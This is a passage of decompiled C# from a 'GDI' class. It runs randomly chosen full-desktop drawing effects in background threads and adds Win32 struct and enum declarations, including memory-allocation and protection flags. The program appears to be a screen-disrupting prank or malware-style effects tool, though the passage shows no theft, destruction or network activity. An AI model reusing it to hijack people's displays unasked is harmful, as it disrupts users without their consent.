					GDI.byte10(this.random.Next(44100), 15);
					break;
				case 11:
					GDI.byte11(this.random.Next(44100), 15);
					break;
				case 12:
					GDI.byte12(this.random.Next(44100), 15);
					break;
				case 13:
					GDI.byte13(this.random.Next(44100), 15);
					break;
				case 14:
					GDI.byte14(this.random.Next(44100), 15);
					break;
				case 15:
					GDI.byte15(this.random.Next(44100), 15);
					break;
				case 16:
					GDI.byte16(this.random.Next(44100), 15);
					break;
				case 17:
					GDI.byte17(this.random.Next(44100), 15);
					break;
				case 18:
					GDI.byte18(this.random.Next(44100), 15);
					break;
				case 19:
					GDI.byte19(this.random.Next(44100), 15);
					break;
				case 20:
					GDI.byte20(this.random.Next(44100), 15);
					break;
				}
			}
		}

		// Token: 0x0200002B RID: 43
		private abstract class Drawer
		{
			// Token: 0x060000B4 RID: 180 RVA: 0x00009964 File Offset: 0x00007B64
			public void Start()
			{
				bool flag = !this.running;
				if (flag)
				{
					this.running = true;
					new Thread(new ThreadStart(this.DrawLoop)).Start();
				}
			}

			// Token: 0x060000B5 RID: 181 RVA: 0x0000999F File Offset: 0x00007B9F
			public void Stop()
			{
				this.running = false;
			}

			// Token: 0x060000B6 RID: 182 RVA: 0x000099AC File Offset: 0x00007BAC
			private void DrawLoop()
			{
				while (this.running)
				{
					IntPtr dc = GDI.GetDC(IntPtr.Zero);
					this.Draw(dc);
					GDI.ReleaseDC(IntPtr.Zero, dc);
				}
			}

			// Token: 0x060000B7 RID: 183 RVA: 0x000099E7 File Offset: 0x00007BE7
			public void Redraw()
			{
				GDI.RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, GDI.RedrawWindowFlags.Invalidate | GDI.RedrawWindowFlags.Erase | GDI.RedrawWindowFlags.AllChildren);
			}

			// Token: 0x060000B8 RID: 184
			public abstract void Draw(IntPtr hdc);

			// Token: 0x040000BA RID: 186
			public bool running;

			// Token: 0x040000BB RID: 187
			public Random random = new Random();

			// Token: 0x040000BC RID: 188
			public int screenW = Screen.PrimaryScreen.Bounds.Width;

			// Token: 0x040000BD RID: 189
			public int screenH = Screen.PrimaryScreen.Bounds.Height;
		}

		// Token: 0x0200002C RID: 44
		[Flags]
		private enum RedrawWindowFlags : uint
		{
			// Token: 0x040000BF RID: 191
			Invalidate = 1U,
			// Token: 0x040000C0 RID: 192
			InternalPaint = 2U,
			// Token: 0x040000C1 RID: 193
			Erase = 4U,
			// Token: 0x040000C2 RID: 194
			Validate = 8U,
			// Token: 0x040000C3 RID: 195
			NoInternalPaint = 16U,
			// Token: 0x040000C4 RID: 196
			NoErase = 32U,
			// Token: 0x040000C5 RID: 197
			NoChildren = 64U,
			// Token: 0x040000C6 RID: 198
			AllChildren = 128U,
			// Token: 0x040000C7 RID: 199
			UpdateNow = 256U,
			// Token: 0x040000C8 RID: 200
			EraseNow = 512U,
			// Token: 0x040000C9 RID: 201
			Frame = 1024U,
			// Token: 0x040000CA RID: 202
			NoFrame = 2048U
		}

		// Token: 0x0200002D RID: 45
		private class randomdrawer : GDI.Drawer
		{
			// Token: 0x060000BA RID: 186 RVA: 0x00009A54 File Offset: 0x00007C54
			public override void Draw(IntPtr hdc)
			{
				Random random = new Random(Guid.NewGuid().GetHashCode());
				int someRandomNumber = GDI.GetSomeRandomNumber(1, 21);
				GDI.Drawer drawer = new GDI.Drawer1();
				GDI.Drawer drawer2 = new GDI.Drawer2();
				GDI.Drawer drawer3 = new GDI.Drawer3();
				GDI.Drawer drawer4 = new GDI.Drawer4();
				GDI.Drawer drawer5 = new GDI.Drawer5();
				GDI.Drawer drawer6 = new GDI.Drawer6();
				GDI.Drawer drawer7 = new GDI.Drawer7();
				GDI.Drawer drawer8 = new GDI.Drawer8();
				GDI.Drawer drawer9 = new GDI.Drawer9();
				GDI.Drawer drawer10 = new GDI.Drawer10();
				GDI.Drawer drawer11 = new GDI.Drawer11();
				GDI.Drawer drawer12 = new GDI.Drawer12();
				GDI.Drawer drawer13 = new GDI.Drawer13();
				GDI.Drawer drawer14 = new GDI.Drawer14();
				GDI.Drawer drawer15 = new GDI.Drawer15();
				GDI.Drawer drawer16 = new GDI.Drawer16();
				GDI.Drawer drawer17 = new GDI.Drawer17();
				GDI.Drawer drawer18 = new GDI.Drawer18();
				GDI.Drawer drawer19 = new GDI.Drawer19();
				GDI.Drawer drawer20 = new GDI.Drawer20();
				switch (someRandomNumber)
				{
				case 1:
					drawer.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer.Stop();
					break;
				case 2:
					drawer2.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer2.Stop();
					break;
				case 3:
					drawer3.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer3.Stop();
					break;
				case 4:
					drawer4.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer4.Stop();
					break;
				case 5:
					drawer5.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer5.Stop();
					break;
				case 6:
					drawer6.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer6.Stop();
					break;
				case 7:
					drawer7.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer7.Stop();
					break;
				case 8:
					drawer8.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer8.Stop();
					break;
				case 9:
					drawer9.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer9.Stop();
					break;
				case 10:
					drawer10.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer10.Stop();
					break;
				case 11:
					drawer11.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer11.Stop();
					break;
				case 12:
					drawer12.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer12.Stop();
					break;
				case 13:
					drawer13.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer13.Stop();
					break;
				case 14:
					drawer14.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer14.Stop();
					break;
				case 15:
					drawer15.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer15.Stop();
					break;
				case 16:
					drawer16.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer16.Stop();
					break;
				case 17:
					drawer17.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer17.Stop();
					break;
				case 18:
					drawer18.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer18.Stop();
					break;
				case 19:
					drawer19.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer19.Stop();
					break;
				case 20:
					drawer20.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer20.Stop();
					break;
				}
			}
		}

		// Token: 0x0200002E RID: 46
		private class randomdrawer1 : GDI.Drawer
		{
			// Token: 0x060000BC RID: 188 RVA: 0x00009ECC File Offset: 0x000080CC
			public override void Draw(IntPtr hdc)
			{
				Random random = new Random(Guid.NewGuid().GetHashCode());
				int someRandomNumber = GDI.GetSomeRandomNumber(1, 21);
				GDI.Drawer drawer = new GDI.Drawer1();
				GDI.Drawer drawer2 = new GDI.Drawer2();
				GDI.Drawer drawer3 = new GDI.Drawer3();
				GDI.Drawer drawer4 = new GDI.Drawer4();
				GDI.Drawer drawer5 = new GDI.Drawer5();
				GDI.Drawer drawer6 = new GDI.Drawer6();
				GDI.Drawer drawer7 = new GDI.Drawer7();
				GDI.Drawer drawer8 = new GDI.Drawer8();
				GDI.Drawer drawer9 = new GDI.Drawer9();
				GDI.Drawer drawer10 = new GDI.Drawer10();
				GDI.Drawer drawer11 = new GDI.Drawer11();
				GDI.Drawer drawer12 = new GDI.Drawer12();
				GDI.Drawer drawer13 = new GDI.Drawer13();
				GDI.Drawer drawer14 = new GDI.Drawer14();
				GDI.Drawer drawer15 = new GDI.Drawer15();
				GDI.Drawer drawer16 = new GDI.Drawer16();
				GDI.Drawer drawer17 = new GDI.Drawer17();
				GDI.Drawer drawer18 = new GDI.Drawer18();
				GDI.Drawer drawer19 = new GDI.Drawer19();
				GDI.Drawer drawer20 = new GDI.Drawer20();
				switch (someRandomNumber)
				{
				case 1:
					drawer20.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer20.Stop();
					break;
				case 2:
					drawer19.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer19.Stop();
					break;
				case 3:
					drawer18.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer18.Stop();
					break;
				case 4:
					drawer17.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer17.Stop();
					break;
				case 5:
					drawer16.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer16.Stop();
					break;
				case 6:
					drawer15.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer15.Stop();
					break;
				case 7:
					drawer14.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer14.Stop();
					break;
				case 8:
					drawer13.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer13.Stop();
					break;
				case 9:
					drawer12.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer12.Stop();
					break;
				case 10:
					drawer11.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer11.Stop();
					break;
				case 11:
					drawer10.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer10.Stop();
					break;
				case 12:
					drawer9.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer9.Stop();
					break;
				case 13:
					drawer8.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer8.Stop();
					break;
				case 14:
					drawer7.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer7.Stop();
					break;
				case 15:
					drawer6.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer6.Stop();
					break;
				case 16:
					drawer5.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer5.Stop();
					break;
				case 17:
					drawer4.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer4.Stop();
					break;
				case 18:
					drawer3.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer3.Stop();
					break;
				case 19:
					drawer2.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer2.Stop();
					break;
				case 20:
					drawer.Start();
					Thread.Sleep(this.random.Next(15000));
					drawer.Stop();
					break;
				}
			}
		}

		// Token: 0x0200002F RID: 47
		public struct _BLENDFUNCTION
		{
			// Token: 0x040000CB RID: 203
			public byte BlendOp;

			// Token: 0x040000CC RID: 204
			public byte BlendFlags;

			// Token: 0x040000CD RID: 205
			public byte SourceConstantAlpha;

			// Token: 0x040000CE RID: 206
			public byte AlphaFormat;
		}

		// Token: 0x02000030 RID: 48
		public struct POINT
		{
			// Token: 0x060000BE RID: 190 RVA: 0x0000A341 File Offset: 0x00008541
			public POINT(int x, int y)
			{
				this.X = x;
				this.Y = y;
			}

			// Token: 0x060000BF RID: 191 RVA: 0x0000A354 File Offset: 0x00008554
			public static implicit operator Point(GDI.POINT p)
			{
				return new Point(p.X, p.Y);
			}

			// Token: 0x060000C0 RID: 192 RVA: 0x0000A378 File Offset: 0x00008578
			public static implicit operator GDI.POINT(Point p)
			{
				return new GDI.POINT(p.X, p.Y);
			}

			// Token: 0x040000CF RID: 207
			public int X;

			// Token: 0x040000D0 RID: 208
			public int Y;
		}

		// Token: 0x02000031 RID: 49
		public enum TernaryRasterOperations
		{
			// Token: 0x040000D2 RID: 210
			SRCCOPY = 13369376,
			// Token: 0x040000D3 RID: 211
			SRCPAINT = 15597702,
			// Token: 0x040000D4 RID: 212
			SRCAND = 8913094,
			// Token: 0x040000D5 RID: 213
			SRCINVERT = 6684742,
			// Token: 0x040000D6 RID: 214
			SRCERASE = 4457256,
			// Token: 0x040000D7 RID: 215
			NOTSRCCOPY = 3342344,
			// Token: 0x040000D8 RID: 216
			NOTSRCERASE = 1114278,
			// Token: 0x040000D9 RID: 217
			MERGECOPY = 12583114,
			// Token: 0x040000DA RID: 218
			MERGEPAINT = 12255782,
			// Token: 0x040000DB RID: 219
			PATCOPY = 15728673,
			// Token: 0x040000DC RID: 220
			PATPAINT = 16452105,
			// Token: 0x040000DD RID: 221
			PATINVERT = 5898313,
			// Token: 0x040000DE RID: 222
			DSTINVERT = 5570569,
			// Token: 0x040000DF RID: 223
			BLACKNESS = 66,
			// Token: 0x040000E0 RID: 224
			WHITENESS = 16711778
		}

		// Token: 0x02000032 RID: 50
		[Flags]
		public enum AllocationType
		{
			// Token: 0x040000E2 RID: 226
			Commit = 4096,
			// Token: 0x040000E3 RID: 227
			Reserve = 8192,
			// Token: 0x040000E4 RID: 228
			Decommit = 16384,
			// Token: 0x040000E5 RID: 229
			Release = 32768,
			// Token: 0x040000E6 RID: 230
			Reset = 524288,
			// Token: 0x040000E7 RID: 231
			Physical = 4194304,
			// Token: 0x040000E8 RID: 232
			TopDown = 1048576,
			// Token: 0x040000E9 RID: 233
			WriteWatch = 2097152,
			// Token: 0x040000EA RID: 234
			LargePages = 536870912
		}

		// Token: 0x02000033 RID: 51
		[Flags]
		public enum MemoryProtection
		{
			// Token: 0x040000EC RID: 236
			Execute = 16,
			// Token: 0x040000ED RID: 237
			ExecuteRead = 32,
			// Token: 0x040000EE RID: 238
			ExecuteReadWrite = 64,
			// Token: 0x040000EF RID: 239
			ExecuteWriteCopy = 128,
			// Token: 0x040000F0 RID: 240
			NoAccess = 1,
			// Token: 0x040000F1 RID: 241
			ReadOnly = 2,
			// Token: 0x040000F2 RID: 242
			ReadWrite = 4,
			// Token: 0x040000F3 RID: 243
			WriteCopy = 8,
			// Token: 0x040000F4 RID: 244
			GuardModifierflag = 256,
			// Token: 0x040000F5 RID: 245
			NoCacheModifierflag = 512,
			// Token: 0x040000F6 RID: 246
			WriteCombineModifierflag = 1024
		}

		// Token: 0x02000034 RID: 52
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct RGBQUAD
		{
			// Token: 0x040000F7 RID: 247
			public byte rgbBlue;

			// Token: 0x040000F8 RID: 248
			public byte rgbGreen;

			// Token: 0x040000F9 RID: 249
			public byte rgbRed;

			// Token: 0x040000FA RID: 250
			public byte rgbReserved;

			// Token: 0x040000FB RID: 251
			public byte b;

			// Token: 0x040000FC RID: 252
			public byte g;

			// Token: 0x040000FD RID: 253
			public byte r;

			// Token: 0x040000FE RID: 254
			public byte a;
		}

		// Token: 0x02000035 RID: 53
		private struct RECT
		{
			// Token: 0x040000FF RID: 255
			public int left;

			// Token: 0x04000100 RID: 256
			public int top;

			// Token: 0x04000101 RID: 257
			public int right;

			// Token: 0x04000102 RID: 258
			public int bottom;
		}

		// Token: 0x02000036 RID: 54
		private struct BLENDFUNCTION
		{
			// Token: 0x04000103 RID: 259
			public byte BlendOp;

			// Token: 0x04000104 RID: 260
			public byte BlendFlags;

			// Token: 0x04000105 RID: 261
			public byte SourceConstantAlpha;

			// Token: 0x04000106 RID: 262
			public byte AlphaFormat;
		}

		// Token: 0x02000037 RID: 55
		private struct BITMAPINFOHEADER
		{
			// Token: 0x04000107 RID: 263
			public uint biSize;

			// Token: 0x04000108 RID: 264
			public int biWidth;

			// Token: 0x04000109 RID: 265
			public int biHeight;

			// Token: 0x0400010A RID: 266
			public ushort biPlanes;

			// Token: 0x0400010B RID: 267
			public ushort biBitCount;

			// Token: 0x0400010C RID: 268
			public uint biCompression;

			// Token: 0x0400010D RID: 269
			public uint biSizeImage;

			// Token: 0x0400010E RID: 270
			public int biXPelsPerMeter;

			// Token: 0x0400010F RID: 271
			public int biYPelsPerMeter;

			// Token: 0x04000110 RID: 272
			public uint biClrUsed;

			// Token: 0x04000111 RID: 273
			public uint biClrImportant;
		}

		// Token: 0x02000038 RID: 56
		private struct BITMAPINFO
		{
			// Token: 0x04000112 RID: 274
			public GDI.BITMAPINFOHEADER bmiHeader;

			// Token: 0x04000113 RID: 275
			public uint bmiColors;
		}
	}
}
